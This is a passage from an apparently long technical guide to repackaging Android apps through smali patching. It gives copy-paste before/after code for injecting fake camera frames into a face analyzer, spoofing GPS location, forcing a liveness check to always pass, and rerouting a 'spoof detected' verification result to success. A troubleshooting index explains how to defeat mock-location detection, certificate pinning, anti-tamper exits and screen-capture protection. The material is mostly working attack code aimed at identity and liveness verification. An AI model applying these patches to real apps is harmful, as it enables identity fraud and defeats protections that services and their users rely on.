done | sort -u | grep -v "^$" || echo "(none found)"

divider "SUMMARY"
echo "Recon complete. Key attack surfaces to investigate:"
echo "  - Review each section above for [FOUND] items"
echo "  - Prioritize: Camera > Liveness > Anti-Tamper > Location > Sensors > Feature Flags"
echo "  - Check Kotlin/AndroidX profile BEFORE writing any hook code"

} 2>&1 | tee "$OUT"

echo ""
echo "=== Report saved to: $OUT ==="
```

---

## 40. Worked Hook Examples (Before / After / Logcat)

Complete copy-paste examples for each of the three hook patterns. Each shows the original smali, the patched smali, and what you see in logcat to confirm it works.

### Example 1: Method Entry Injection -- Camera Frame Replacement

**Scenario:** App uses CameraX `ImageAnalysis.Analyzer`. We want to replace every incoming frame with our prepared image.

**Step 1: Find the target method**
```bash
grep -rn "implements.*ImageAnalysis\$Analyzer" decoded/smali*/
# Result: decoded/smali_classes2/com/target/camera/FaceAnalyzer.smali
grep -n "\.method.*analyze" decoded/smali_classes2/com/target/camera/FaceAnalyzer.smali
# Result: line 47: .method public analyze(Landroidx/camera/core/ImageProxy;)V
```

**Step 2: Read the original method**
```smali
# BEFORE (FaceAnalyzer.smali, starting at line 47)
.method public analyze(Landroidx/camera/core/ImageProxy;)V
    .locals 5
    .param p1, "imageProxy"

    .line 23
    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->getWidth()I
    move-result v0

    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->getHeight()I
    move-result v1

    .line 24
    invoke-static {p1}, Lcom/target/camera/FrameUtils;->toBitmap(Landroidx/camera/core/ImageProxy;)Landroid/graphics/Bitmap;
    move-result-object v2

    .line 25
    invoke-virtual {p0, v2}, Lcom/target/camera/FaceAnalyzer;->processFace(Landroid/graphics/Bitmap;)V

    .line 26
    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->close()V

    return-void
.end method
```

**Step 3: Patch -- inject interceptor at method entry**
```smali
# AFTER (FaceAnalyzer.smali)
.method public analyze(Landroidx/camera/core/ImageProxy;)V
    .locals 5
    .param p1, "imageProxy"

    # >>> HOOK: replace ImageProxy before anything reads it
    invoke-static {p1}, Lcom/hookengine/core/FrameInterceptor;->intercept(Landroidx/camera/core/ImageProxy;)Landroidx/camera/core/ImageProxy;
    move-result-object p1
    # <<< END HOOK

    .line 23
    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->getWidth()I
    move-result v0

    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->getHeight()I
    move-result v1

    .line 24
    invoke-static {p1}, Lcom/target/camera/FrameUtils;->toBitmap(Landroidx/camera/core/ImageProxy;)Landroid/graphics/Bitmap;
    move-result-object v2

    .line 25
    invoke-virtual {p0, v2}, Lcom/target/camera/FaceAnalyzer;->processFace(Landroid/graphics/Bitmap;)V

    .line 26
    invoke-interface {p1}, Landroidx/camera/core/ImageProxy;->close()V

    return-void
.end method
```

**What changed:** Two lines added after `.param`. No registers changed, no `.locals` bump needed (we reused `p1`).

**Step 4: Verify in logcat**
```
$ adb logcat -s FrameInterceptor
D/FrameInterceptor: intercept() called -- frame #1 loaded from /sdcard/poc_frames/face_neutral/frame_0001.png (640x480)
D/FrameInterceptor: intercept() called -- frame #2 loaded from /sdcard/poc_frames/face_neutral/frame_0002.png (640x480)
D/FrameInterceptor: intercept() called -- frame #3 loaded from /sdcard/poc_frames/face_neutral/frame_0003.png (640x480)
D/FrameInterceptor: FRAME_DELIVERED count=3
```

**If you don't see this:** Hook not firing. Check that `FrameInterceptor.smali` is in the same `smali_classes*` directory and the `.class` directive matches the path.

---

### Example 2: Call-Site Interception -- Location Spoofing

**Scenario:** App calls `getLastKnownLocation()` inside a method. We intercept the return value.

**Step 1: Find the call site**
```bash
grep -rn "getLastKnownLocation" decoded/smali*/
# Result: decoded/smali/com/target/location/LocationHelper.smali:82
```

**Step 2: Read the original**
```smali
# BEFORE (LocationHelper.smali, around line 78)
.method public getCurrentLocation()Landroid/location/Location;
    .locals 4

    .line 30
    iget-object v0, p0, Lcom/target/location/LocationHelper;->locationManager:Landroid/location/LocationManager;
    const-string v1, "gps"

    .line 31
    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
    move-result-object v2

    .line 32
    if-eqz v2, :no_location

    invoke-virtual {v2}, Landroid/location/Location;->getLatitude()D
    move-result-wide v3
    # ... uses v2 (the Location) further down ...

    return-object v2

    :no_location
    const/4 v2, 0x0
    return-object v2
.end method
```

**Step 3: Patch -- intercept right after getLastKnownLocation returns**
```smali
# AFTER (LocationHelper.smali)
.method public getCurrentLocation()Landroid/location/Location;
    .locals 4

    .line 30
    iget-object v0, p0, Lcom/target/location/LocationHelper;->locationManager:Landroid/location/LocationManager;
    const-string v1, "gps"

    .line 31
    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
    move-result-object v2

    # >>> HOOK: replace real location with spoofed location
    invoke-static {v2}, Lcom/hookengine/core/LocationInterceptor;->interceptLocation(Landroid/location/Location;)Landroid/location/Location;
    move-result-object v2
    # <<< END HOOK

    .line 32
    if-eqz v2, :no_location

    invoke-virtual {v2}, Landroid/location/Location;->getLatitude()D
    move-result-wide v3

    return-object v2

    :no_location
    const/4 v2, 0x0
    return-object v2
.end method
```

**What changed:** Two lines inserted after `move-result-object v2`. The interceptor receives the real Location (or null) and returns a fake one. Same register `v2` is reused -- all downstream code now uses the fake Location. No `.locals` bump needed.

**Step 4: Verify in logcat**
```
$ adb logcat -s LocationInterceptor
D/LocationInterceptor: interceptLocation() -- replacing real=(null) with fake=(40.7580, -73.9855) acc=8.0m
D/LocationInterceptor: LOCATION_DELIVERED lat=40.7580 lng=-73.9855
D/LocationInterceptor: interceptLocation() -- replacing real=(null) with fake=(40.7580, -73.9855) acc=9.2m
D/LocationInterceptor: LOCATION_DELIVERED lat=40.7580 lng=-73.9855
```

**If you see "Mock location detected" in the app:** The `isFromMockProvider()` patch is missing. Find and patch it separately (see Section 8).

---

### Example 3: Return Value Replacement -- Force Liveness Result

**Scenario:** App has a method `checkLiveness()` that returns a boolean. We force it to always return `true`.

**Step 1: Find the method**
```bash
grep -rn "checkLiveness\|isLive\|verifyLiveness\|livenessResult" decoded/smali*/
# Result: decoded/smali_classes2/com/target/verify/LivenessChecker.smali
grep -n "\.method.*checkLiveness" decoded/smali_classes2/com/target/verify/LivenessChecker.smali
# Result: line 112: .method public checkLiveness(Landroid/graphics/Bitmap;)Z
```

**Step 2: Read the original**
```smali
# BEFORE (LivenessChecker.smali, line 112)
.method public checkLiveness(Landroid/graphics/Bitmap;)Z
    .locals 8
    .param p1, "faceBitmap"

    .line 45
    invoke-virtual {p0, p1}, Lcom/target/verify/LivenessChecker;->extractFeatures(Landroid/graphics/Bitmap;)[F
    move-result-object v0

    .line 46
    invoke-virtual {p0, v0}, Lcom/target/verify/LivenessChecker;->computeScore([F)F
    move-result v1

    .line 47
    const v2, 0x3f5c28f6    # float 0.86 (threshold)
    cmpl-float v3, v1, v2
    if-gez v3, :is_live

    .line 48
    const/4 v4, 0x0
    return v4

    :is_live
    .line 49
    const/4 v4, 0x1
    return v4
.end method
```

**Step 3: Patch -- replace entire method body**
```smali
# AFTER (LivenessChecker.smali)
.method public checkLiveness(Landroid/graphics/Bitmap;)Z
    .locals 1

    # >>> HOOK: force liveness to always pass
    const/4 v0, 0x1
    return v0
    # <<< END HOOK
.end method
```

**What changed:** Entire method body replaced. Original had 8 locals, complex logic, a threshold comparison. Now it's 2 instructions. `.locals` reduced to 1 (only need `v0`). This is safe because `p` registers (p0=this, p1=bitmap) are separate from `.locals`.

**Step 4: Verify in logcat**
No interceptor log here (the method is replaced, not hooked). Verify by checking the app flow:
```
$ adb logcat -d | grep -iE "liveness|live|spoof|face"
D/VerifyActivity: Liveness check result: true
D/VerifyActivity: Proceeding to next step...
```

**If the app still fails:** There may be a second liveness check (server-side, or a different code path). Search for other methods:
```bash
grep -rn "liveness\|isLive\|checkLive" decoded/smali*/ | grep "\.method"
```

---

### Example 4: Adding Debug Logging (Diagnostic Hook)

**Scenario:** You don't know what value a register holds at a specific point. Inject a log to find out.

**Step 2: Read the original**
```smali
# BEFORE (VerifyManager.smali, line 89)
.method public onVerificationResult(ILjava/lang/String;)V
    .locals 3
    .param p1, "resultCode"
    .param p2, "message"

    .line 67
    packed-switch p1, :pswitch_data_0
    # ... cases ...
```

**Step 3: Patch -- add logging to see resultCode and message**
```smali
# AFTER (VerifyManager.smali)
.method public onVerificationResult(ILjava/lang/String;)V
    .locals 5
    .param p1, "resultCode"
    .param p2, "message"

    # >>> DEBUG: log the result code and message
    const-string v3, "SmaliDebug"
    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V
    const-string v0, "onVerificationResult code="
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    const-string v0, " msg="
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    # <<< END DEBUG

    .line 67
    packed-switch p1, :pswitch_data_0
    # ... cases ...
```

**What changed:** `.locals 3` bumped to `.locals 5` (need v3 and v4). Uses StringBuilder to concatenate the int `p1` and string `p2` into one log line. Registers v0 is reused for temp strings (safe because original code hasn't used v0 yet at this point -- we're at the very top).

**Step 4: Verify in logcat**
```
$ adb logcat -s SmaliDebug
D/SmaliDebug: onVerificationResult code=0 msg=Verification successful
D/SmaliDebug: onVerificationResult code=3 msg=Liveness check failed: spoof detected
```

Now you know: result code 0 = success, 3 = spoof. You can patch the `packed-switch` to route code 3 to the success handler.

---

## 41. Troubleshooting Error Index

Reverse lookup: find your error, get pointed to the right section and fix.

### Crash Errors (logcat FATAL EXCEPTION)

| Error in logcat | Cause | Fix | Section |
|----------------|-------|-----|---------|
| `java.lang.VerifyError: Rejecting class ... because it failed compile-time verification` | Smali register type conflict at branch merge point | Check register assignments on ALL paths to merge point. Use different registers or restructure. | 4, 28 |
| `java.lang.VerifyError: register vN has type Integer but expected Reference` | Reused a register for incompatible types across branches | Use separate registers for the int and object values | 4, 37 |
| `java.lang.VerifyError: register vN has type Undefined` | Code path where register is never assigned reaches a use point | Assign register on ALL code paths before use | 4 |
| `java.lang.ClassNotFoundException: com.hookengine.core.FrameInterceptor` | Injected class not found in DEX | Verify `.smali` file is in correct `smali_classes*` dir, `.class` directive matches path | 15, 37 |
| `java.lang.ClassNotFoundException: kotlin.jvm.internal.Intrinsics` | Hook code references Kotlin but app has no Kotlin runtime | Rewrite hook using only Java/Android framework classes | 37 |
| `java.lang.NoSuchMethodError: No static method intercept(...)` | Method signature in `invoke-static` doesn't match the actual method in your injected class | Compare param types and return type character-by-character | 4, 5 |
| `java.lang.NoClassDefFoundError: Failed resolution of: Landroidx/...` | Hook references AndroidX but app uses Support Library (or neither) | Check which library the app uses, match your references | 37 |
| `java.lang.NullPointerException` at hook point | Register was null when hook expected a value | Add null check before passing to interceptor, or handle null in interceptor | 26 |
| `java.lang.SecurityException: Permission denied` | Missing runtime permission | Grant via `adb shell pm grant` | 16 |
| `java.lang.UnsatisfiedLinkError: dlopen failed` | Native lib missing or wrong architecture | Check `lib/` has the right ABI; don't delete libs unless app has fallback | 11, 36 |
| App exits with no exception in logcat | Anti-tamper called `System.exit()` or `Process.killProcess()` | Search for exit/kill calls, nop them or patch the check | 10, 26 |

### Build Errors (apktool / apksigner)

| Error | Cause | Fix | Section |
|-------|-------|-----|---------|
| `brut.androlib.AndrolibException: brut.common.BrutException: could not exec` | apktool can't find aapt2 | Install Android SDK build-tools, ensure `aapt2` is on PATH | 1 |
| `brut.androlib.AndrolibException: Could not decode resource` | Missing framework for system/vendor APK | `apktool if framework-res.apk` from device | 37 |
| `Error: 9-patch image ... malformed` | 9-patch PNG corruption during decode/rebuild | Use `apktool d --no-res` if you don't need resource edits, or use same apktool version | 37 |
| `W: invalid resource directory name` | Resource name conflict across versions | Use `apktool b --use-aapt2` or try a different apktool version | 37 |
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | App already installed with different signature | `adb uninstall <package>` first | 22 |
| `INSTALL_FAILED_NO_MATCHING_ABIS` | APK has arm64 libs, emulator is x86 (or vice versa) | Use matching emulator/device architecture | 22 |
| `INSTALL_FAILED_INVALID_APK` | APK corrupt or not properly signed | Re-run full pipeline: `apktool b` → `zipalign` → `apksigner sign` | 1, 22 |
| `Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES]` | APK not signed or signing failed silently | Re-sign, verify with `apksigner verify -v` | 1, 37 |
| `zipalign verification failed` after signing | Ran zipalign AFTER apksigner (wrong order) | Always: zipalign first, then apksigner | 1 |

### Runtime Issues (App Runs But Hooks Don't Work)

| Symptom | Cause | Fix | Section |
|---------|-------|-----|---------|
| No `HookEngine` entries in logcat | Bootstrap hook not firing | Verify `Application.onCreate()` patch. Check if app uses a custom Application class. | 2, 6 |
| `FRAME_DELIVERED` count = 0 | Payload directory empty or wrong path | `adb shell ls /sdcard/poc_frames/` -- verify path matches hook code | 7, verify Phase 2 |
| `FRAME_DELIVERED` but "no face detected" | Frame too small, wrong format, or wrong resolution | Match frame resolution to ImageAnalysis config. Face should be >30% of frame, centered. | 7, 24 |
| `LOCATION_DELIVERED` but "mock location detected" | `isFromMockProvider()` / `isMock()` not patched | Grep for and patch mock detection methods | 8 |
| Location coordinates wrong | Config file not found or stale | Verify `/sdcard/poc_location/config.json` content on device | 8, verify Phase 2 |
| Sensor values causing "device anomaly" | Physics violation: accelerometer magnitude != 9.81 | Recalculate: `sqrt(x^2+y^2+z^2)` must be ~9.81 | 9, 37 |
| Hook fires once then stops | App recreates Activity (rotation, config change) and hook state is lost | Verify hooks survive `onPause()`/`onResume()` cycle | verify Phase 6 |
| App shows "network error" after patching | Certificate pinning blocking SDK API calls | Patch `network_security_config.xml` or nop `CertificatePinner.check()` | 10 |
| App works on emulator but fails on device | Native lib architecture mismatch, or hardware-backed attestation fails | Test on matching device. Check if Play Integrity is device-level. | 34, 36 |
| Patched feature flag reverts after launch | Firebase Remote Config fetches server values, overriding defaults | Nop `fetchAndActivate()` call or patch the consumption point | 38 |
| App silently ignores injected frames | App has A/B test, using a different code path than the one you patched | Search for multiple `ImageAnalysis.Analyzer` implementations, patch ALL | 37 |
| `FileNotFoundException: /sdcard/poc_frames/...` | Scoped storage (API 30+) blocking file access | Add `MANAGE_EXTERNAL_STORAGE` permission + `adb shell appops set` grant | 37 |

### ADB / Device Issues

| Symptom | Fix | Section |
|---------|-----|---------|
| `adb devices` shows nothing | Enable USB debugging on device. Try different USB cable/port. | 17 |
| `adb devices` shows `offline` | `adb kill-server && adb start-server`. Accept RSA key on device. | 22 |
| `adb devices` shows `unauthorized` | Accept the "Allow USB debugging" prompt on device screen | 17 |
| `error: more than one device/emulator` | Specify device: `adb -s <serial> ...` | 17 |
| `adb shell run-as <package>` fails | App not debuggable. Set `android:debuggable="true"` in manifest, rebuild. | 26 |
| `adb push` succeeds but file not visible | File pushed to wrong location, or scoped storage hiding it. Use full path. | 37 |
| Screen recording black screen | App has `FLAG_SECURE`. Inject `clearFlags(0x2000)` in Activity. | 16 |

### Smali Editing Mistakes

| Mistake | What Happens | How to Catch | Section |
|---------|-------------|-------------|---------|
| Bumped `.registers` instead of `.locals` | Parameter registers shift, ALL existing code breaks silently | App crashes with VerifyError or NPE. Always bump `.locals`. | 4, 37 |
| Forgot to bump `.locals` | Register index out of bounds | VerifyError: `register vN out of range` | 4 |
| Used `move-result` after `invoke` that returns `void` | VerifyError | Check method return type: `V` = void, no `move-result` allowed | 4 |
| Used `move-result` instead of `move-result-object` | Type mismatch: expected Reference | `move-result` for primitives (Z, I, F), `move-result-object` for objects (L...; ) | 4 |
| Used `move-result-wide` for non-wide type | Corrupts next register | Only use for `J` (long) and `D` (double) return types | 28 |
| Wrote `invoke-virtual` for a `static` method | NoSuchMethodError or VerifyError | Check if method has `static` modifier. Static = `invoke-static` (no `this`). | 4 |
| Wrote `invoke-virtual` for an `interface` method | VerifyError | If the register type is an interface, use `invoke-interface` | 4 |
| Put injected class in wrong `smali_classes*` dir | ClassNotFoundException (usually), or works fine (ART merges all DEX) | Verify with logcat. Place in same dir as calling class to be safe. | 15, 37 |
| Patch targets wrong method overload | Hook never fires (wrong method signature matched) | Verify full descriptor: method name + param types + return type | 6 |
| Forgot `move-result-object` after `invoke-static` that returns an object | Next instruction reads stale register value | Interceptor fires but return value is ignored. Always pair `invoke` with `move-result`. | 5 |
